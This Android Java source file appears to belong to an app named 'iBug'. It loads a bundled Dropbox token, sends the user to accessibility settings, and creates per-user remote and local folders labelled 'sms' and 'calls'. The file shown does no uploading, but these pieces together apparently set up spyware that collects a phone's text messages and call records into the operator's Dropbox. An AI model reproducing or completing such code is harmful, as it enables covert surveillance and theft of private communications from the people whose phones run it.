package com.ibug.misc;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.EditText;

import androidx.databinding.BaseObservable;
import androidx.databinding.Bindable;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.NetworkIOException;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.CreateFolderBatchLaunch;
import com.dropbox.core.v2.files.DbxUserFilesRequests;
import com.dropbox.core.v2.files.ListFolderBuilder;
import com.dropbox.core.v2.files.Metadata;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.ibug.IAnnotations.InnerClass;
import com.ibug.IAnnotations.Usage;
import com.ibug.R;

import java.io.File;
import java.io.InputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Executors;

import static com.ibug.misc.Utils.Tag;
import static com.ibug.misc.Utils.accessRoot;
import static com.ibug.misc.Utils.accessToken;
import static com.ibug.misc.Utils.getRootStorage;

public class AppSettings extends BaseObservable {

    public String name;
    private String site;
    private boolean retry = false;
    private static boolean remoteSettingsStarted = false;

    public AppSettings(Context c) {
        remoteSettings.config(c);
    }

    public String getSite() {
        return site;
    }

    public void setSite(String site) {
        this.site = site;
    }

    @Bindable
    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
        notifyPropertyChanged(com.ibug.BR.name);
    }

    @Usage("fragment_settings.xml")
    public void openAppSettings(View view) {
        Context context = view.getContext();
        String packageName = context.getPackageName();
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", packageName, null);
        intent.setData(uri);
        context.startActivity(intent);
    }

    @Usage("fragment_settings.xml")
    public void openAppAccessibility(View view) {
        Context context = view.getContext();
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    @Usage("fragment_settings.xml")
    public void settingsDone(View view) {
        Context c = view.getContext();
        String _user = ((EditText)view).getText().toString();
        final String user = _user.length() > 0 ? _user : getName();

        // @BackgroundTask
        if (!remoteSettingsStarted)
        Executors.newSingleThreadExecutor().execute(()-> {
            remoteSettingsStarted = true;
            remoteSettings.prepareDirectories(c, user);
        });

    }

    @InnerClass
    private class AppRemoteSettings {

        private void prepareDirectories(Context c, String user) {
            try {
                String root = accessRoot(c), token = accessToken(c);
                DbxRequestConfig config = DbxRequestConfig.newBuilder(root).build();
                DbxClientV2 client = new DbxClientV2(config, token);
                DbxUserFilesRequests request = client.files();
                ListFolderBuilder folderBuilder = request.listFolderBuilder("");
                List<Metadata> metadataList = folderBuilder.start().getEntries();
                createFolderBatch(c, request, user, metadataList);
                remoteSettingsStarted = false;
            }

            catch(NetworkIOException io) {
                AlertBox ioAlert = new AlertBox(c);
                String stressText = "Network IO Error"; //noinspection ResourceType
                String stressColor = c.getString(R.color.error);
                String aMessage = c.getString(R.string.network_io_exception);
                ioAlert.message(aMessage, stressText, stressColor);
                ioAlert.setPositiveButton("Retry", (dialog, id)-> {
                    dialog.cancel();
                    // @BackgroundTask
                    Executors.newSingleThreadExecutor().execute(()->{
                        retry = true;
                        prepareDirectories(c, user);
                    });
                });

                ioAlert.setNegativeButton("Cancel", (dialog, which) -> {
                    dialog.cancel();
                    remoteSettingsStarted = false;
                });
                ioAlert.setCancelable(false);
                ioAlert.show();
            }

            catch (Exception e) {
                AlertBox eAlert = new AlertBox(c);
                String stressText = "Fatal Error.\\s";
                String troubleshoot = "Directories not created. Try again later";
                //noinspection ResourceType
                String stressColor = c.getString(R.color.error);
                String aMessage = stressText + troubleshoot;
                eAlert.message(aMessage, stressText, stressColor);
                eAlert.setPositiveButton("Retry", (dialog, id)->{
                    dialog.cancel();
                    // @BackgroundTask
                    Executors.newSingleThreadExecutor().execute(()->{
                        retry = true;
                        prepareDirectories(c, user);
                    });
                });

                eAlert.setNegativeButton("Cancel", (dialog, which) -> {
                    dialog.cancel();
                    remoteSettingsStarted = false;
                });
                eAlert.setCancelable(false);
                eAlert.show();
            }

        }

        private void createFolderBatch(Context c, DbxUserFilesRequests req,
                                       String user, List<Metadata> metadataList) throws Exception {
            boolean userExist = false;
            if (metadataList.size() > 0)
            for (Metadata metadata : metadataList) {
                userExist = user.equals(metadata.getName());
                if (userExist) break;
            }

            List<String> batchFolder = new LinkedList<>();
            batchFolder.add('/' + user);
            batchFolder.add('/' + user + "/sms");
            batchFolder.add('/' + user + "/calls");

            if (userExist) {
                AlertBox retryAlert = new AlertBox(c);
                String troubleshoot = "Try another user name";
                String stressText = "User name:"+getName()+", already exist. ";
                //noinspection ResourceType
                String stressColor = c.getString(R.color.warning);
                String aMessage = stressText + troubleshoot;
                retryAlert.message(aMessage, stressText, stressColor);
                retryAlert.setPositiveButton("Retry", (dialog, id)->{
                    dialog.cancel();
                    String input= retryAlert.getInputText();
                    Executors.newSingleThreadExecutor().execute(
                            ()->{
                                try { createFolderBatch(c, req, input, metadataList); }
                                catch (Exception e) {Log.d(Tag, "userExist", e);}
                            }
                    );
                });
                retryAlert.showAlertInput(true);
                retryAlert.setCancelable(false);
                retryAlert.title("Dropbox");
                retryAlert.show();
            }

            else {

                CreateFolderBatchLaunch batch = req.createFolderBatch(batchFolder);
                if (batch.isComplete()) {
                    AlertBox successAlert = new AlertBox(c);
                    String stressText = "successfully";
                    //noinspection ResourceType
                    String stressColor = c.getString(R.color.success);
                    String aMessage = "Folders were "+stressText+" created. Thank you";
                    successAlert.message(aMessage, stressText, stressColor);
                    successAlert.setPositiveButton("Okay", (dialog, which) -> {
                        dialog.cancel();
                        createLocalDirectories(batchFolder);
                        SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
                        SharedPreferences.Editor editor = pref.edit();
                        editor.putString("sms", batchFolder.get(1));
                        editor.putString("calls", batchFolder.get(2));
                        editor.putString("user", batchFolder.get(0));
                        editor.apply();
                    });
                    successAlert.setCancelable(false);
                    successAlert.title("Dropbox");
                    successAlert.show();
                }
                else {
                    Log.d(Tag, String.valueOf(batch));
                }

            }

        }

        private void config(Context c) {
            String jsonString = null;
            try {
                AssetManager asset = c.getAssets();
                InputStream in = asset.open("access_token");
                byte[] buffer = new byte[in.available()];
                in.read(buffer);
                in.close();
                jsonString = new String(buffer, "UTF-8");
            }

            catch (Exception e) { Log.d(Tag, "AppSettings<config>", e); }

            finally {
                if (jsonString != null) {
                    JsonObject jsonObj = new Gson().fromJson(jsonString, JsonObject.class);
                    String root = jsonObj.get("root").getAsString();
                    String token = jsonObj.get("token").getAsString();
                    SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
                    SharedPreferences.Editor editor = pref.edit();
                    editor.putString("accessRoot", root);
                    editor.putString("accessToken", token);
                    editor.apply();
                }

            }

        }

    }

    private void createLocalDirectories(List<String> batchFolder) {
        File sms = new File(getRootStorage(), batchFolder.get(1));
        File calls = new File(getRootStorage(), batchFolder.get(2));
        File _user = new File(getRootStorage(), batchFolder.get(0));
        if ( !_user.exists() ) {
            boolean isCreated = _user.mkdir();
            if (isCreated) {
                sms.mkdir();
                calls.mkdir();
            }
        }
    }

    private AppRemoteSettings remoteSettings = new AppRemoteSettings();

}
